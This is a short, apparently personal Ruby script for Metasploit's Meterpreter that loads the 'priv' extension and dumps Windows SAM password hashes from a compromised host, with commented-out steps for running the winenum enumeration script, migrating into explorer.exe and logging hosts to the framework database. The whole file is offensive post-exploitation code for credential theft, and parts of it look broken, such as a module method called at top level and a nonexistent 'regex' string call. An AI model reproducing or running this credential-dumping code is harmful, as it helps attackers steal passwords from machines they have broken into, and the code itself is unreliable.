require 'camof'

#ENV[:BASE] = "/home/nox/apps/"

require 'winenum'

# if session.framework.db.active
   #   session.framework.db.report_host(
   #     :workspace => session.framework.db.workspace,
   #     :host => "ip_text",
   #     :mac  => "asdasd"
   #   )
   #   session.framework.db 
   # end
      

#require 'pp' 
#require "#{ENV[:BASE]}/home/nox/apps/msf3/scripts/meterpreter/winenum"
#client.run_cmd("run migrateToExplorerExe.rb")
#client.run_cmd("run winenum")

infos = {}

hashes = {}
infos[:hashes] =  hashes

module Reconnaissance
    def gethash() 
        begin
            hash = ''
            @client.core.use("priv")
            hashes = @client.priv.sam_hashes
            hashes.each do |h|
                printf "## "
                printf h.to_s.regex + "\n"
                hash << h.to_s+"\n"
            end
            hash << "\n\n\n"
        rescue ::Exception => e
            puts "verdammt"
        end
        puts hashes
    end
end

gethash()
